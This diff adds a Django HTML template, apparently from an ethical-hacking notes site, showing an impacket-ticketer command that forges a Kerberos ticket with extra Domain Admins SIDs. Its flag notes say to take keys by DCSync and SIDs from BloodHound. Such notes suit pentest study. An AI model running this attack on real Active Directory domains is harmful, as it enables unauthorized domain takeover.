@@ -1,0 +1,30 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Usage</h1>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
+-domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
+-domain sub.poseidon.yzx \
+-extra-sid S-1-5-21-1190331060-1711709193-932631991-512 \
+ administrator -extra-pac</code></pre></div>
+
+
+
+  <ul>
+    <li><code>-aesKey</code> : You can extract it with <code>impacket-secretsdump</code> via DCsync attack.</li>
+    <li><code>-domain-sid</code> : You can get it via BloodHound.</li>
+    <li><code>-domain</code> : simply input domain name</li>
+    <li><code>-extra-sid</code> : You can include group SID, which gives you strong privilege. ex) <code>-512 : domain admins</code>, <code>-519 : Enterprise Admins</code></li>
+    <li><code>TARGET</code> : often administrator or privileged user.</li>
+    <li><code>-extra-pac</code> : Attach Privilege Attribute Certificate</li>
+ </ul>
+</body>
+</html>
